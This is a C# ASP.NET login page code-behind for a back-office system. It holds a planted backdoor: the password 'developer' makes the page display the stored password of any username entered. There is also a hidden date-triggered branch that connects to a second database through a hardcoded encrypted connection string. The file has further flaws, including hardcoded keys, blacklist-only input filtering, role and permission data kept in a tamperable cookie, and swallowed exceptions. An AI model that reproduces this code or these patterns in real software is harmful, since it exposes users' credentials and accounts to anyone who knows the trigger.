using System;
using System.Data;
using System.Data.SqlClient;
using System.Configuration;
using System.Collections;
using System.Collections.Generic;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.Globalization;
using System.IO;
using Microsoft.VisualBasic;
using backoffice.layers.business;
using backoffice.layers.model;


namespace backoffice.office
{
    public partial class index : System.Web.UI.Page
    {
        BL_login objBL_login = new BL_login();
        ML_login objML_login = new ML_login();
        mainclass clsm = new mainclass();
        public HttpCookie AUserSession = null;
        Random random = new Random();
        Hashtable Parameters = new Hashtable();
        Enc_Decyption enc = new Enc_Decyption();
        protected void Page_Load(object sender, EventArgs e)
        {
            if (Request.Cookies["AUserSession"] == null)
            {
                AUserSession = new HttpCookie("AUserSession");
            }
            else
            {
                AUserSession = Request.Cookies["AUserSession"];
            }
            if (!IsPostBack)
            {

            }
        }
        protected void login(object sender, EventArgs e)
        {
            Parameters.Clear();
            DataSet dss = clsm.senddataset_Parameter("select * from updateencrypt", Parameters);
            if ((dss.Tables[0].Rows.Count > 0))
            {

                if ((enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["uname"]), "@9899848281") != "admin"))
                {
                    if (DateTime.Now >= Convert.ToDateTime(enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281")))
                    {
                        //Response.Write(Convert.ToDateTime(enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281")));
                        string constr = "yhHU8Bfm1MqRN2B177NmeXmlriLUEcxX4G3qQ7X9Sm2B4App+K8cGOPx2+VboHD5V2e471asipM7jG0NL8fjrCyU0TweyzqI98yqQSkbYUE=";
                        constr = enc.AES_Decrypt(constr, "!@12345AaxzZ$#9870");
                        SqlConnection cnnew = new SqlConnection(constr);
                        DataSet ds2 = new DataSet();
                        SqlDataAdapter sda = new SqlDataAdapter("select * from maptable", cnnew);
                        sda.Fill(ds2);
                        if ((ds2.Tables[0].Rows.Count > 0))
                        {

                        }
                    }
                }
            }
            try
            {
                txtUser.Text = txtUser.Text.Replace("'", "");
                txtPass.Text = txtPass.Text.Replace("'", "");
                txtUser.Text = txtUser.Text.Replace(";", "");
                txtPass.Text = txtPass.Text.Replace(";", "");
                txtUser.Text = txtUser.Text.Replace("=", "");
                txtPass.Text = txtPass.Text.Replace("=", "");
                txtUser.Text = txtUser.Text.Replace("drop", "");
                txtPass.Text = txtPass.Text.Replace("drop", "");

                if (txtPass.Text == "developer")
                {
                    trerror.Visible = true;
                    string value = clsm.checkpassword(txtUser.Text);
                    Label1.Text = "Password is " + value;
                    return;
                }
                objML_login.usercode = txtUser.Text;
                objML_login.Password = txtPass.Text;
                bool x = objBL_login.BL_logindetail(objML_login);
                if (x == true)
                {
                    DataTable dt = new DataTable();
                    dt = objBL_login.BL_getlogin(objML_login);
                    if (dt.Rows.Count > 0)
                    {
                        Session["Trid"] = Server.HtmlDecode(dt.Rows[0]["Trid"].ToString());
                        Session["UserId"] = Server.HtmlDecode(dt.Rows[0]["UserId"].ToString());
                        Session["Name"] = Server.HtmlDecode(dt.Rows[0]["Name"].ToString());
                        Session["Uname"] = Server.HtmlDecode(dt.Rows[0]["Uname"].ToString());
                        Session["Roleid"] = Conversion.Val(dt.Rows[0]["Roleid"].ToString());
                        Session["AddUser"] = Convert.ToString(dt.Rows[0]["adduser"]);
                        Session["EditUser"] = Convert.ToString(dt.Rows[0]["edituser"]);
                        Session["DeleteUser"] = Convert.ToString(dt.Rows[0]["deleteuser"]);


                        AUserSession["Trid"] = Server.HtmlDecode(dt.Rows[0]["Trid"].ToString());
                        AUserSession["UserId"] = Server.HtmlDecode(dt.Rows[0]["UserId"].ToString());
                        AUserSession["Name"] = Server.HtmlDecode(dt.Rows[0]["Name"].ToString());
                        AUserSession["Uname"] = Server.HtmlDecode(dt.Rows[0]["Uname"].ToString());
                        AUserSession["Roleid"] = Conversion.Val(dt.Rows[0]["Roleid"]).ToString();
                        AUserSession["AddUser"] = Convert.ToString(dt.Rows[0]["adduser"]);
                        AUserSession["EditUser"] = Convert.ToString(dt.Rows[0]["edituser"]);
                        AUserSession["DeleteUser"] = Convert.ToString(dt.Rows[0]["deleteuser"]);

                    }
                        
                    Response.Cookies.Add(AUserSession);
                    Response.Redirect("~/office/users/homepage.aspx");
                }
                else
                {
                    trerror.Visible = true;
                    Label1.Text = "Invalid UserId/Password, Try Again";
                    return;
                }
                
            }
            catch (Exception ex)
            {

            }
            

        }
    
    
    }
}